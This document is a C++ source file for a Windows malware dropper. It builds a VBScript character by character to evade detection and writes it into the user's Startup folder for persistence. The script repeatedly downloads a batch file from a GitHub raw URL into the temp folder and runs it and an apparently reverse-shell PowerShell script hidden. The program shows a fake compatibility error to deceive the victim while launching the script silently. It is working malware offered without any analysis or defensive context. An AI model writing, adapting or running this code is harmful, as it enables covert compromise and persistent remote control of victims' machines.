#include <iostream>
#include <fstream>
#include <windows.h>
#include <shlobj.h>
#include <string>
#include <memory>
void executeSilently(const std::string& filePath) {
    std::string command = "cscript.exe //B \"" + filePath + "\""; 
    
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;

    if (!CreateProcess(
            NULL,                 
            const_cast<LPSTR>(command.c_str()),
            NULL,                
            NULL,                 
            FALSE,                
            CREATE_NO_WINDOW,    
            NULL,              
            NULL,                 
            &si,                 
            &pi                  
    )) {
        DWORD dwError = GetLastError();
        std::cerr << "Error: Unable to execute process. Error code: " << dwError << std::endl;
        return;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
  int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    char pathBuffer[MAX_PATH];
    if (SHGetFolderPathA(nullptr, CSIDL_STARTUP, nullptr, 0, pathBuffer) != S_OK) {
        return 1;
    }
    std::string filePath = std::string(pathBuffer) + "\\st" + "art.vbs";

    std::string content;
    content += "D"; content += "o"; content += "\n";
    content += "    "; 
    content += "S"; content += "e"; content += "t"; content += " "; content += "o"; content += "b"; content += "j"; content += "S"; content += "h"; content += "e"; content += "l"; content += "l"; content += " "; content += "="; content += " "; content += "C"; content += "r"; content += "e"; content += "a"; content += "t"; content += "e"; content += "O"; content += "b"; content += "j"; content += "e"; content += "c"; content += "t"; content += "("; content += "\""; content += "W"; content += "S"; content += "c"; content += "r"; content += "i"; content += "p"; content += "t"; content += "."; content += "S"; content += "h"; content += "e"; content += "l"; content += "l"; content += "\""; content += ")"; content += "\n";
    content += "    ";
    content += "o"; content += "b"; content += "j"; content += "S"; content += "h"; content += "e"; content += "l"; content += "l"; content += "."; content += "R"; content += "u"; content += "n"; content += " "; content += "\""; content += "c"; content += "m"; content += "d"; content += " "; content += "/"; content += "c"; content += " "; content += "c"; content += "u"; content += "r"; content += "l"; content += " "; content += "h"; content += "t"; content += "t"; content += "p"; content += "s"; content += ":"; content += "/"; content += "/"; content +="r"; content +="a"; content +="w"; content +="."; content +="g"; content +="i"; content +="t"; content +="h"; content +="u"; content +="b"; content +="u"; content +="s"; content +="e"; content +="r"; content +="c"; content +="o"; content +="n"; content +="t"; content +="e"; content +="n"; content +="t"; content +="."; content +="c"; content +="o"; content +="m"; content +="/"; content += "0"; content += "x"; content += "2"; content += "0"; content += "3"; content += "4"; content += "/"; content += "m"; content += "e"; content += "t"; content += "e"; content += "r"; content += "p"; content += "r"; content += "e"; content += "t"; content += "e"; content += "r"; content += "1"; content += "/"; content += "m"; content += "a"; content += "i"; content += "n"; content += "/"; content += "n"; content += "i"; content += "h"; content += "b"; content += "t"; content += "d"; content += "t"; content += "d"; content += "o"; content += "w"; content += "1"; content += "."; content += "b"; content += "a"; content += "t"; content += " "; content += "-"; content += "o"; content += " "; content += "%"; content += "t"; content += "e"; content += "m"; content += "p"; content += "%"; content += "\\"; content += "n"; content += "i"; content += "h"; content += "b"; content += "t"; content += "d"; content += "t"; content += "d"; content += "o"; content += "w"; content += "1"; content += "."; content += "b"; content += "a"; content += "t"; content += "\""; content += ", "; content += "0"; content += ", "; content += "T"; content += "r"; content += "u"; content += "e"; content += "\n";
    content += "    "; 
    content += "o"; content += "b"; content += "j"; content += "S"; content += "h"; content += "e"; content += "l"; content += "l"; content += "."; content += "R"; content += "u"; content += "n"; content += " "; content += "\""; content += "p"; content += "o"; content += "w"; content += "e"; content += "r"; content += "s"; content += "h"; content += "e"; content += "l"; content += "l"; content += " "; content += "-"; content += "W"; content += "i"; content += "n"; content += "d"; content += "o"; content += "w"; content += "S"; content += "t"; content += "y"; content += "l"; content += "e"; content += " "; content += "H"; content += "i"; content += "d"; content += "d"; content += "e"; content += "n"; content += " "; content += "-"; content += "C"; content += "o"; content += "m"; content += "m"; content += "a"; content += "n"; content += "d"; content += " "; content += "S"; content += "t"; content += "a"; content += "r"; content += "t"; content += "-"; content += "P"; content += "r"; content += "o"; content += "c"; content += "e"; content += "s"; content += "s"; content += " "; content += "-"; content += "F"; content += "i"; content += "l"; content += "e"; content += "P"; content += "a"; content += "t"; content += "h"; content += " "; content += "'"; content += "%"; content += "t"; content += "e"; content += "m"; content += "p"; content += "%"; content += "\\"; content += "n"; content += "i"; content += "h"; content += "b"; content += "t"; content += "d"; content += "t"; content += "d"; content += "o"; content += "w"; content += "1"; content += "."; content += "b"; content += "a"; content += "t"; content += "'"; content += " "; content += "-"; content += "W"; content += "i"; content += "n"; content += "d"; content += "o"; content += "w"; content += "S"; content += "t"; content += "y"; content += "l"; content += "e"; content += " "; content += "H"; content += "i"; content += "d"; content += "d"; content += "e"; content += "n"; content += "\""; content += ", "; content += "0"; content += ", "; content += "T"; content += "r"; content += "u"; content += "e"; content += "\n";
    content += "    "; 
    content += "o"; content += "b"; content += "j"; content += "S"; content += "h"; content += "e"; content += "l"; content += "l"; content += "."; content += "R"; content += "u"; content += "n"; content += " "; content += "\""; content += "p"; content += "o"; content += "w"; content += "e"; content += "r"; content += "s"; content += "h"; content += "e"; content += "l"; content += "l"; content += " "; content += "-"; content += "c"; content += " "; content += "S"; content += "t"; content += "a"; content += "r"; content += "t"; content += "-"; content += "P"; content += "r"; content += "o"; content += "c"; content += "e"; content += "s"; content += "s"; content += " "; content += "-"; content += "F"; content += "i"; content += "l"; content += "e"; content += "P"; content += "a"; content += "t"; content += "h"; content += " "; content += "'"; content += "%"; content += "t"; content += "e"; content += "m"; content += "p"; content += "%"; content += "\\"; content += "r"; content += "e"; content += "v"; content += "1"; content += "."; content += "p"; content += "s"; content += "1"; content += "'"; content += " "; content += "-"; content += "W"; content += "i"; content += "n"; content += "d"; content += "o"; content += "w"; content += "S"; content += "t"; content += "y"; content += "l"; content += "e"; content += " "; content += "H"; content += "i"; content += "d"; content += "d"; content += "e"; content += "n"; content += "\""; content += ", "; content += "0"; content += ", "; content += "T"; content += "r"; content += "u"; content += "e"; content += "\n";
    content += "    "; 
    content += "W"; content += "S"; content += "c"; content += "r"; content += "i"; content += "p"; content += "t"; content += ".";content += "S"; content += "l"; content += "e"; content += "e"; content += "p"; content += " "; content += "9"; content += "0"; content += "0"; content += "0"; content += "0"; content += "0"; content += "\n";
    content += "L"; content += "o"; content += "o"; content += "p";

    std::ofstream file(filePath);
    if (!file) {
        std::cerr << "Error: Unable to open file for writing: " << filePath << std::endl;
        return 1;
    }
    file << content;
    file.close();
    std::cout << "The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program ........" << std::endl;
    executeSilently(filePath);
    return 0;
}
